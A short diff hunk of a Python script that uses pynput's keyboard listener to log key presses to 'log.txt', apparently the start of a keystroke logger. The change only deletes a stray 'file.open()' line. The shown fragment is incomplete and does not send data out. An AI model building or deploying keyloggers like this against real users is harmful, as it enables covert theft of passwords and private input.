@@ -3,7 +3,7 @@ import io
 from pynput import keyboard
 file= open("log.txt",'w')
 
-file.open()
+
 
 def on_press(key):
     try:
